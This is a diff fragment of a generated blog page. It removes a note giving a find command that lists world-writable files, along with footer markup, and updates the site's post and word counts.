-<li>Find<ul>
-<li><strong><code>🔺命令：find / -perm 777 -exec ls -l {}（前面所搜到的结果） \;</code></strong></li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3192,7 +3192,7 @@ BA：管理员账户</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">184</span>
+                  <span class="site-state-item-count">189</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3299,7 +3299,7 @@ BA：管理员账户</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">179.7k</span>
+    <span title="Site words total count">184.3k</span>
   
 </div>
 
